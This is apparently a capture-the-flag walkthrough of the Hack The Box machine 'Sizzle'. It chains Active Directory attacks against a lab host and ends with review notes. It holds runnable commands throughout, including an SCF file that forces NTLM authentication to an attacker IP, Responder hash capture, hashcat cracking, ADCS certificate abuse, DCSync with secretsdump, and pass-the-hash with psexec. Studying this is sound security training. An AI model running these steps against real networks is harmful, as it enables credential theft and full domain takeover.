<h2 id="introduction">Introduction</h2>
<p>Sizzle is an Insane Windows Active Directory machine. Its route is long because it chains several distinct Active Directory techniques.</p>
<blockquote>
<p><strong>The difficulty rating measures the complexity of individual steps, not the number of steps. A well-chosen path through an Insane box can be faster than a Medium box with a long, winding road.</strong></p>
</blockquote>
<p>The machine's core vulnerability chain is elegant:</p>
<pre><code>Writable SMB Share → NTLM Hash Capture → Crack → ADCS Certificate → WinRM Shell → DCSync → Domain Admin
</code></pre>
<p>The chain combines forced authentication, ADCS certificate enrollment, WinRM, and DCSync. Its impact comes from several smaller Active Directory misconfigurations working together.</p>
<hr>
<h2 id="phase-1-initial-reconnaissance">Phase 1: Initial Reconnaissance</h2>
<h3 id="what-is-this-machine-telling-me">"What is this machine telling me?"</h3>
<p>Start by collecting hostnames, services, and other details exposed by the target.</p>
<h3 id="step-1-1-port-scanning-with-nmap">Step 1.1: Port Scanning with Nmap</h3>
<pre><code class="language-bash" data-language="bash">nmap -p- -sS --open --min-rate 5000 -Pn -n -vvv -oG allPorts 10.129.1.1
</code></pre>
<p><strong>What this command does:</strong></p>
<ul>
<li><code>-p-</code> : Scan all 65,535 TCP ports. We do this because services sometimes run on non-standard ports.</li>
<li><code>-sS</code> : SYN scan (stealthy, doesn't complete the handshake).</li>
<li><code>--open</code> : Only show open ports (reduces noise).</li>
<li><code>--min-rate 5000</code> : Send at least 5,000 packets per second. On HTB/CTF networks, speed matters more than stealth.</li>
<li><code>-Pn</code> : Don't ping the host first. Windows often blocks ICMP, so skipping host discovery saves time.</li>
<li><code>-n</code> : Don't do DNS resolution. Faster.</li>
<li><code>-vvv</code> : Very verbose. Shows open ports as they're found.</li>
</ul>
<p> You can't attack what you don't know exists. A full port scan is the foundation of everything.</p>

<h2 id="phase-2-smb-enumeration-finding-the-entry-point">Phase 2: SMB Enumeration: Finding the Entry Point</h2>
<h3 id="where-can-i-write">"Where can I write?"</h3>
<p>SMB (Server Message Block) is Windows' file sharing protocol. In Active Directory, shares contain everything from software deployments to sensitive documents. But more importantly for us:</p>
<blockquote>
<p><strong>If you can write to an SMB share that other users access, you can force those users to authenticate to you. And when Windows authenticates, it sends hashes.</strong></p>
</blockquote>
<h3 id="step-2-1-listing-available-shares">Step 2.1: Listing Available Shares</h3>
<pre><code class="language-bash" data-language="bash">smbclient -N -L //10.129.1.1
</code></pre>
<p><strong>Output analysis:</strong></p>
<pre><code>Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
CertEnroll      Disk      Active Directory Certificate Services share
Department Shares Disk
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
Operations      Disk
SYSVOL          Disk      Logon server share
</code></pre>
<p><strong>Why we care about each share:</strong></p>
<ul>
<li><code>ADMIN$</code> and <code>C$</code> : Administrative shares. Only admins can access these.</li>
<li><code>CertEnroll</code> : Related to ADCS (Active Directory Certificate Services). We'll come back to this.</li>
<li><code>Department Shares</code> : <strong>Non-default share.</strong> This is user-created and therefore likely to have misconfigurations.</li>
<li><code>IPC$</code> : Inter-process communication. Sometimes accessible but limited.</li>
<li><code>NETLOGON</code> / <code>SYSVOL</code> : Domain controller shares. Usually read-only for domain users.</li>
<li><code>Operations</code> : Another non-default share.</li>
</ul>
<p> Non-default shares (<code>Department Shares</code>, <code>Operations</code>) are created by administrators for business purposes. Business convenience often trumps security. <strong>prioritize non-default shares in your enumeration.</strong></p>
<h3 id="step-2-2-accessing-the-department-shares">Step 2.2: Accessing the Department Shares</h3>
<pre><code class="language-bash" data-language="bash">smbclient "\\10.129.1.1\Department Shares" -N
</code></pre>
<p>Or, more conveniently, mount it locally:</p>
<pre><code class="language-bash" data-language="bash">sudo mkdir -p /mnt/sizzle
sudo mount -t cifs '//10.129.1.1/Department Shares' /mnt/sizzle -o username=guest,password=
</code></pre>
<p><strong>Why mount it?</strong> Because once mounted, you can use all your Linux tools (<code>find</code>, <code>tree</code>, <code>touch</code>, scripts) to enumerate it. This is faster than navigating through <code>smbclient</code>'s interactive shell.</p>
<h3 id="step-2-3-finding-writable-directories">Step 2.3: Finding Writable Directories</h3>
<p>After mounting, we explore:</p>
<pre><code class="language-bash" data-language="bash">cd /mnt/sizzle &amp;&amp; ls
</code></pre>
<p>We see many department folders: <code>Accounting</code>, <code>Audit</code>, <code>Banking</code>, <code>CEO_protected</code>, <code>Devops</code>, <code>Finance</code>, <code>HR</code>, <code>Infosec</code>, <code>Infrastructure</code>, <code>IT</code>, <code>Legal</code>, <code>M&amp;A</code>, <code>Marketing</code>, <code>R&amp;D</code>, <code>Sales</code>, <code>Security</code>, <code>Tax</code>, <code>Users</code>, <code>ZZ_ARCHIVE</code>.</p>
<p><strong>The critical question:</strong> Which of these can we write to?</p>
<p>We create a simple test script:</p>
<pre><code class="language-bash" data-language="bash">#!/bin/bash
list=$(find /mnt/sizzle -type d)
for d in $list; do
    touch $d/x 2&gt;/dev/null
    if [ $? -eq 0 ]; then
        echo "$d is WRITABLE"
        rm $d/x
    fi
done
</code></pre>
<p><strong>Results:</strong> Two directories are writable:</p>
<ul>
<li><code>/mnt/sizzle/Users/Public</code></li>
<li><code>/mnt/sizzle/ZZ_ARCHIVE</code></li>
</ul>
<p><strong>The reasoning - Why the finding matters:</strong></p>
<blockquote>
<p><strong>A writable SMB share is not just a file storage location. It is a platform for coercion.</strong></p>
<p>When a Windows user browses a folder containing certain file types, Windows automatically tries to load icons, thumbnails, or metadata. Each of these automatic actions can be weaponized to force the user to authenticate to an attacker-controlled server.</p>
</blockquote>
<hr>
<h2 id="phase-3-the-scf-attack-capturing-hashes">Phase 3: The SCF Attack: Capturing Hashes</h2>
<h3 id="how-do-i-make-the-machine-authenticate-to-me">"How do I make the machine authenticate to me?"</h3>
<p>Windows loves to be helpful. When you open a folder in File Explorer, Windows tries to:</p>
<ol>
<li>Show file icons</li>
<li>Show thumbnails for images/videos</li>
<li>Read file metadata</li>
<li>Load folder customization files</li>
</ol>
<p>If any of these operations reference a remote resource (like <code>\\attacker-ip\share\icon.ico</code>), Windows will <strong>automatically attempt to authenticate</strong> to that remote server using the current user's credentials.</p>
<h3 id="step-3-1-understanding-the-scf-file">Step 3.1: Understanding the SCF File</h3>
<p>SCF stands for <strong>Shell Command File</strong>. It's a legacy Windows format used for folder customization. The key feature:</p>
<pre><code class="language-scf" data-language="scf">[Shell]
Command=2
IconFile=\\10.10.14.6\share\icon
[Taskbar]
Command=ToggleDesktop
</code></pre>
<p><strong>Mechanism:</strong></p>
<ul>
<li><code>IconFile</code> tells Windows: "When displaying this folder, load the icon from this network path."</li>
<li>Windows sees <code>\\10.10.14.6\share\icon</code> and thinks: "I need to connect to that SMB server to get the icon."</li>
<li>To connect, Windows sends the user's <strong>NTLM authentication handshake</strong>.</li>
<li>If we run a tool like Responder on <code>10.10.14.6</code>, it intercepts this handshake and captures the hash.</li>
</ul>
<h3 id="step-3-2-setting-up-responder">Step 3.2: Setting Up Responder</h3>
<p>Responder is a tool that listens for LLMNR, NBT-NS, and MDNS broadcast requests, and poisons them to capture authentication attempts.</p>
<pre><code class="language-bash" data-language="bash">sudo responder -I tun0
</code></pre>
<p><strong>What Responder does:</strong></p>
<ul>
<li>It tells the network: "I am the server you're looking for."</li>
<li>When Windows tries to reach <code>\\10.10.14.6\share</code>, Responder says: "That's me! Authenticate please."</li>
<li>Windows sends the NTLMv2 challenge-response hash.</li>
<li>Responder saves it.</li>
</ul>
<h3 id="step-3-3-deploying-the-scf-file">Step 3.3: Deploying the SCF File</h3>
<pre><code class="language-bash" data-language="bash">cat &lt;&lt; 'EOF' &gt; sizzle.scf
[Shell]
Command=2
IconFile=\\10.10.14.6\share\icon
[Taskbar]
Command=ToggleDesktop
EOF

sudo cp sizzle.scf /mnt/sizzle/Users/Public/
</code></pre>
<p><strong>Why drop it in <code>Users/Public</code>?</strong></p>
<ul>
<li><code>Public</code> is a special Windows folder accessible to all users.</li>
<li>Automated processes, scripts, or users browsing the share will trigger it.</li>
<li>The writeup noted that this share has an <strong>auto-cleanup mechanism</strong> (files deleted every ~4 minutes), but the hash is captured almost instantly.</li>
</ul>
<h3 id="step-3-4-capturing-the-hash">Step 3.4: Capturing the Hash</h3>
<p>Within seconds to minutes, Responder catches an authentication:</p>
<pre><code>[SMB] NTLMv2-SSP Client   : 10.129.1.1
[SMB] NTLMv2-SSP Username : HTB\amanda
[SMB] NTLMv2-SSP Hash     : amanda::HTB:1122334455667788:REDACTED_HASH_OR_FLAG:0101000000000000...
</code></pre>
<p> We didn't exploit a vulnerability. We didn't use a zero-day. We simply <strong>placed a file in a writable location and let Windows do what Windows does</strong>. This is called a <strong>forced authentication attack</strong> or <strong>coerced authentication</strong>, and it is one of the most reliable techniques in internal network penetration testing.</p>
<hr>
<h2 id="phase-4-hash-cracking-from-hash-to-password">Phase 4: Hash Cracking: From Hash to Password</h2>
<h3 id="can-i-turn-this-hash-into-something-usable">"Can I turn this hash into something usable?"</h3>
<p>An NTLMv2 hash is not a password - it's a <strong>challenge-response</strong>. It proves the client knows the password, but it doesn't reveal the password directly. However, if the password is weak, we can "crack" it by trying millions of passwords until we find one that produces the same response.</p>
<h3 id="step-4-1-saving-the-hash">Step 4.1: Saving the Hash</h3>
<pre><code class="language-bash" data-language="bash">cat &lt;&lt; 'EOF' &gt; amanda.hash
amanda::HTB:1122334455667788:REDACTED_HASH_OR_FLAG:REDACTED_ENCODED_LAB_MATERIAL
EOF
</code></pre>
<h3 id="step-4-2-cracking-with-hashcat">Step 4.2: Cracking with Hashcat</h3>
<pre><code class="language-bash" data-language="bash">hashcat -m 5600 amanda.hash /usr/share/wordlists/rockyou.txt
</code></pre>
<p><strong>Why hashcat mode 5600?</strong></p>
<ul>
<li>Hashcat uses numeric modes to identify hash types.</li>
<li>Mode 5600 = NetNTLMv2 (the format Responder captured).</li>
</ul>
<p><strong>Why rockyou.txt?</strong></p>
<ul>
<li><code>rockyou.txt</code> is a wordlist containing ~14 million real passwords leaked from the RockYou breach in 2009.</li>
<li>It remains one of the most effective wordlists because humans are predictable.</li>
</ul>
<h3 id="step-4-3-the-result">Step 4.3: The Result</h3>
<pre><code>Ashare1972       (amanda)
</code></pre>
<p> <code>Ashare1972</code> is a weak password. It follows a common pattern: <strong>Name fragment + word + year</strong>. This is exactly the kind of password corporate users create when forced to follow "complexity requirements" without understanding security.</p>
<blockquote>
<p><strong>Password complexity rules (uppercase + lowercase + number + symbol) don't stop humans from being predictable. They just force users to append <code>123</code> or <code>!</code> to their existing weak passwords.</strong></p>
</blockquote>
<hr>
<h2 id="phase-5-active-directory-certificate-services-adcs">Phase 5: Active Directory Certificate Services (ADCS)</h2>
<h3 id="why-can-t-i-just-winrm-with-this-password">"Why can't I just WinRM with this password?"</h3>
<p>With credentials in hand, the natural next step is:</p>
<pre><code class="language-bash" data-language="bash">evil-winrm -i 10.129.1.1 -u amanda -p REDACTED
</code></pre>
<p>But this fails with a strange error:</p>
<pre><code>Error: Unable to parse authorization header. Headers: {...} Body: (401)
</code></pre>
<p><strong>Why does this happen?</strong></p>
<p>This machine has a policy that <strong>disables password-based WinRM authentication</strong>. Instead, it requires <strong>certificate-based authentication</strong>. This is actually a security feature - but like all security features, it creates new attack surface.</p>
<p><strong>What is ADCS?</strong></p>
<p>Active Directory Certificate Services is Microsoft's Public Key Infrastructure (PKI). It issues digital certificates that can be used for:</p>
<ul>
<li>Encrypting files</li>
<li>Signing code</li>
<li><strong>Authenticating to services (including WinRM)</strong></li>
</ul>
<p>The <code>/certsrv</code> endpoint is a web interface where authenticated users can request certificates. And guess what? <code>amanda</code> is an authenticated user.</p>
<h3 id="step-5-1-discovering-the-certsrv-endpoint">Step 5.1: Discovering the certsrv Endpoint</h3>
<p>During web enumeration, directory brute-forcing reveals:</p>
<pre><code>/certsrv          (Status: 401)
</code></pre>
<p>The <code>401</code> status means it requires authentication. We have credentials, so we can access it.</p>
<h3 id="step-5-2-generating-a-certificate-signing-request-csr">Step 5.2: Generating a Certificate Signing Request (CSR)</h3>
<p>To get a certificate, we first need to create a private key and a Certificate Signing Request (CSR). The CSR contains our public key and identity information, which the Certificate Authority (CA) will sign.</p>
<pre><code class="language-bash" data-language="bash">openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr
</code></pre>
<p><strong>What this does:</strong></p>
<ul>
<li><code>-newkey rsa:2048</code> : Create a new 2048-bit RSA key pair.</li>
<li><code>-nodes</code> : No DES encryption (don't encrypt the private key with a password).</li>
<li><code>-keyout amanda.key</code> : Save the private key.</li>
<li><code>-out amanda.csr</code> : Save the Certificate Signing Request.</li>
</ul>
<p>You will be prompted for information (Country, Organization, etc.). You can fill in anything - it doesn't matter for authentication purposes.</p>
<h3 id="step-5-3-requesting-the-certificate-via-web-interface">Step 5.3: Requesting the Certificate via Web Interface</h3>
<ol>
<li>Navigate to <code>http://10.129.1.1/certsrv</code></li>
<li>Login with <code>amanda</code> / <code>Ashare1972</code></li>
<li>Click <strong>"Request a certificate"</strong></li>
<li>Click <strong>"advanced certificate request"</strong></li>
<li>Paste the contents of <code>amanda.csr</code> into the large text field</li>
<li>Select <strong>"User"</strong> as the Certificate Template</li>
<li>Click <strong>Submit</strong></li>
<li>Select <strong>"Base 64 encoded"</strong></li>
<li>Click <strong>"Download certificate"</strong> : save as <code>certnew.cer</code></li>
</ol>
<p><strong>Mechanism:</strong> In ADCS, the "User" certificate template allows any authenticated domain user to request a certificate that can be used for client authentication. The CA trusts the request because <code>amanda</code> provided valid domain credentials.</p>


<hr>
<h2 id="phase-6-certificate-based-winrm-authentication">Phase 6: Certificate-Based WinRM Authentication</h2>
<h3 id="i-have-a-key-now-i-need-a-door">"I have a key. Now I need a door."</h3>
<p>WinRM (Windows Remote Management) is Microsoft's implementation of WS-Management protocol. It's essentially SSH for Windows - it gives you a PowerShell remote shell.</p>
<p>Ports:</p>
<ul>
<li><code>5985</code> : WinRM over HTTP</li>
<li><code>5986</code> : WinRM over HTTPS (what we need for certificate auth)</li>
</ul>
<h3 id="step-6-1-connecting-with-evil-winrm">Step 6.1: Connecting with evil-winrm</h3>
<p>Evil-winrm supports certificate authentication:</p>
<pre><code class="language-bash" data-language="bash">evil-winrm -S -c certnew.cer -k amanda.key -i 10.129.1.1 -u 'amanda' -p REDACTED
</code></pre>
<p><strong>Parameters explained:</strong></p>
<ul>
<li><code>-S</code> : Use SSL (required for certificate auth on port 5986)</li>
<li><code>-c certnew.cer</code> : The certificate issued by the CA</li>
<li><code>-k amanda.key</code> : Our private key (proves we own the certificate)</li>
<li><code>-u amanda</code> : The username the certificate was issued for</li>
<li><code>-p 'Ashare1972'</code> : Still needed for some evil-winrm internals, even though auth is certificate-based</li>
</ul>
<p><strong>Success:</strong></p>
<pre><code class="language-powershell" data-language="powershell">*Evil-WinRM* PS C:\Users\amanda\Documents&gt; whoami
htb\amanda
</code></pre>


<hr>
<h2 id="phase-7-post-exploitation-and-the-shortcut">Phase 7: Post-Exploitation &amp; The Shortcut</h2>
<h3 id="i-m-in-what-s-already-here">"I'm in. What's already here?"</h3>
<p>Once inside, most beginners immediately start uploading enumeration tools. But the experienced hacker first asks:</p>

<h3 id="step-7-1-checking-the-shell-environment">Step 7.1: Checking the Shell Environment</h3>
<pre><code class="language-powershell" data-language="powershell">$ExecutionContext.SessionState.LanguageMode
</code></pre>
<p>Output: <code>ConstrainedLanguage</code></p>
<p><strong>What is ConstrainedLanguage mode?</strong></p>
<ul>
<li>PowerShell has multiple language modes: <code>FullLanguage</code>, <code>ConstrainedLanguage</code>, <code>RestrictedLanguage</code>, <code>NoLanguage</code>.</li>
<li><code>ConstrainedLanguage</code> blocks many .NET and COM object interactions, making it harder to run certain post-exploitation tools.</li>
<li>It is often enabled by AppLocker or Device Guard.</li>
</ul>
<p>This means we can't easily run SharpHound, certain PowerShell download cradles, or .NET executables from memory. We would need a bypass (like PSBypassCLM) to escalate to <code>FullLanguage</code> mode.</p>
<p><strong>But wait</strong> - do we need a better shell right now?</p>
<h3 id="step-7-2-the-shortcut-file-txt">Step 7.2: The Shortcut: file.txt</h3>
<pre><code class="language-powershell" data-language="powershell">type C:\Windows\system32\file.txt
</code></pre>
<p><strong>Output:</strong></p>
<pre><code>krbtgt:502:REDACTED_HASH_OR_FLAG:REDACTED_HASH_OR_FLAG:::
Administrator:500:REDACTED_HASH_OR_FLAG:REDACTED_HASH_OR_FLAG:::

Domain    User  ID  Hash
------    ----  --  ----
HTB.LOCAL Guest 501 -
amanda:1104:REDACTED_HASH_OR_FLAG:REDACTED_HASH_OR_FLAG:::
mrb3n:1105:REDACTED_HASH_OR_FLAG:REDACTED_HASH_OR_FLAG:::
mrlky:1603:REDACTED_HASH_OR_FLAG:REDACTED_HASH_OR_FLAG:::
</code></pre>
<p><strong>What is this file?</strong></p>
<p>This appears to be a pre-existing dump of NTDS hashes or a collection of credential material left on the system. In a real engagement, finding such a file would indicate:</p>
<ol>
<li>A previous attacker</li>
<li>A backup or migration artifact</li>
<li>An administrator's poorly secured credential store</li>
</ol>
<p><strong>Why this is valuable:</strong> It contains <code>mrlky</code>'s NTLM hash: <code>REDACTED_HASH_OR_FLAG</code>.</p>


<hr>
<h2 id="phase-8-dcsync-stealing-the-domain">Phase 8: DCSync: Stealing the Domain</h2>
<h3 id="who-has-privileged-access">"Who has privileged access?"</h3>
<p>In Active Directory, domain controllers replicate password data with each other using the DRSUAPI protocol. The DCSync attack abuses this: <strong>if you have the right permissions, you can pretend to be a domain controller and ask for all password hashes.</strong></p>
<h3 id="step-8-1-why-mrlky">Step 8.1: Why mrlky?</h3>
<p>From the file.txt, we have <code>mrlky</code>'s hash. But why <code>mrlky</code> specifically? In a real engagement, we would run BloodHound to find who has DCSync rights. BloodHound would show that <code>mrlky</code> has:</p>
<ul>
<li><code>GetChanges</code> : Can request directory changes</li>
<li><code>GetChangesAll</code> : Can request ALL directory changes (including passwords)</li>
</ul>
<p>These two permissions together = <strong>DCSync capability</strong>.</p>


<h3 id="step-8-2-running-secretsdump-py">Step 8.2: Running secretsdump.py</h3>
<p>We run this from our Kali machine using <code>mrlky</code>'s hash:</p>
<pre><code class="language-bash" data-language="bash">impacket-secretsdump -hashes REDACTED_HASH_OR_FLAG:REDACTED_HASH_OR_FLAG htb.local/mrlky@10.129.1.1
</code></pre>
<p><strong>What happens:</strong></p>
<ul>
<li>We authenticate as <code>mrlky</code> using Pass-the-Hash (no plaintext password needed).</li>
<li>We call the DRSUAPI <code>GetNCChanges</code> function.</li>
<li>The domain controller sends us the NTDS.dit secrets - all password hashes in the domain.</li>
</ul>
<p><strong>Output (truncated):</strong></p>
<pre><code>Administrator:500:REDACTED_HASH_OR_FLAG:REDACTED_HASH_OR_FLAG:::
Guest:501:REDACTED_HASH_OR_FLAG:REDACTED_HASH_OR_FLAG:::
krbtgt:502:REDACTED_HASH_OR_FLAG:REDACTED_HASH_OR_FLAG:::
amanda:1104:REDACTED_HASH_OR_FLAG:REDACTED_HASH_OR_FLAG:::
mrlky:1603:REDACTED_HASH_OR_FLAG:REDACTED_HASH_OR_FLAG:::
sizzler:1604:REDACTED_HASH_OR_FLAG:REDACTED_HASH_OR_FLAG:::
</code></pre>
<p><strong>Fresh Administrator hash:</strong> <code>REDACTED_HASH_OR_FLAG</code></p>
<p><strong>Note:</strong> The hash from <code>file.txt</code> was stale (<code>c718f548...</code>), but DCSync gives us the <strong>current</strong> hash. This is why we didn't skip directly to PTH with the file.txt hash - stale hashes fail.</p>


<hr>
<h2 id="phase-9-pass-the-hash-becoming-system">Phase 9: Pass-the-Hash: Becoming SYSTEM</h2>
<h3 id="i-don-t-need-your-password-i-have-your-hash">"I don't need your password. I have your hash."</h3>
<p>In Windows authentication, the <strong>NTLM hash</strong> is what actually proves identity. When you type a password, Windows converts it to an NTLM hash and uses that hash for everything. This means:</p>
<blockquote>
<p><strong>If you have the NTLM hash, you don't need the password. You can "pass the hash" directly to authenticate.</strong></p>
</blockquote>
<h3 id="step-9-1-pth-with-psexec-py">Step 9.1: PTH with psexec.py</h3>
<pre><code class="language-bash" data-language="bash">impacket-psexec -hashes REDACTED_HASH_OR_FLAG:REDACTED_HASH_OR_FLAG htb.local/Administrator@10.129.1.1
</code></pre>
<p><strong>What psexec does:</strong></p>
<ol>
<li>Authenticates to SMB using the Administrator hash</li>
<li>Uploads a service executable to <code>ADMIN$</code> (which is <code>C:\Windows</code>)</li>
<li>Creates and starts a Windows service</li>
<li>The service runs as <code>SYSTEM</code></li>
<li>We get a command shell</li>
</ol>
<p><strong>Success:</strong></p>
<pre><code>Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt; whoami
nt authority\system
</code></pre>
<h3 id="step-9-2-grabbing-the-flags">Step 9.2: Grabbing the Flags</h3>
<pre><code class="language-cmd" data-language="cmd">type C:\Users\mrlky\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
</code></pre>
<p><strong>Results:</strong></p>
<pre><code>e6062d[redacted]8c052c0b1e
d9d0a5[redacted]38d5d7c444e
</code></pre>


<hr>
<h2 id="review-notes">Review notes</h2>
<h3 id="1-chain-the-misconfigurations">1. Chain the Misconfigurations</h3>
<p>Sizzle is not compromised by one vulnerability. It is compromised by a <strong>chain</strong>:</p>
<ul>
<li>Writable SMB share (misconfiguration)</li>
<li>SCF file triggers authentication (design behavior)</li>
<li>Weak password allows cracking (human factor)</li>
<li>ADCS allows certificate issuance (design behavior)</li>
<li>WinRM accepts certificate auth (design behavior)</li>
<li>Mrlky has DCSync rights (permission misconfiguration)</li>
<li>Pass-the-Hash completes compromise (protocol design)</li>
</ul>
<blockquote>
<p><strong>Each individual step is "working as intended." The attack emerges from the interaction of these intended behaviors.</strong></p>
</blockquote>
<h3 id="2-forced-authentication-is-silent-and-deadly">2. Forced Authentication Is Silent and Deadly</h3>
<p>The SCF attack requires no exploit, no vulnerability scanner, no reverse shell. You drop a file and wait. It is:</p>
<ul>
<li><strong>Stealthy</strong> : No logs of exploitation, just normal SMB activity</li>
<li><strong>Reliable</strong> : Windows ALWAYS tries to load icons</li>
<li><strong>Effective</strong> : Works on almost every Windows domain with writable shares</li>
</ul>
<h3 id="3-certificates-are-credentials">3. Certificates Are Credentials</h3>
<p>When you see ADCS, think: "Can I get a certificate?" Certificates are often overlooked by defenders but grant the same access as passwords - sometimes more.</p>
<h3 id="4-look-for-what-s-already-there">4. Look for What's Already There</h3>
<p>Before uploading SharpHound, BloodHound, or any toolkit, look at what the system already contains:</p>
<ul>
<li>Log files with credentials</li>
<li>Backup files</li>
<li>Scripts with hardcoded passwords</li>
<li><code>file.txt</code> with dumped hashes</li>
</ul>
<blockquote>
<p><strong>The fastest hack is the one you don't have to perform because someone already did it for you.</strong></p>
</blockquote>
<h3 id="5-dcsync-is-domain-death">5. DCSync Is Domain Death</h3>
<p>If you can DCSync, the game is over. Every password in the domain is yours. The only recovery is a full forest recovery - rotating every password, resetting the KRBTGT password twice (to invalidate Golden Tickets), and auditing every account.</p>
<h3 id="6-hashes-are-passwords">6. Hashes Are Passwords</h3>
<p>Treat NTLM hashes with the same sensitivity as plaintext passwords. With Pass-the-Hash, they ARE passwords. A domain with LM hashes enabled, weak passwords, or excessive replication rights is a domain waiting to fall.</p>
